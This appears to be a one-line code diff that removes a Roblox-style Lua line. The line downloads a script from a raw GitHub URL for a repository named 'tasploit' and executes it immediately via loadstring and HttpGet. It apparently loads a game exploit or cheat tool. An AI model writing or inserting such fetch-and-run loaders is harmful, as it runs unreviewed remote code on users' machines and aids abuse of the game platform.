@@ -1,1 +1,0 @@
- loadstring(game:HttpGet("https://raw.githubusercontent.com/Squid-source/tasploit/main/tas.lua"))();
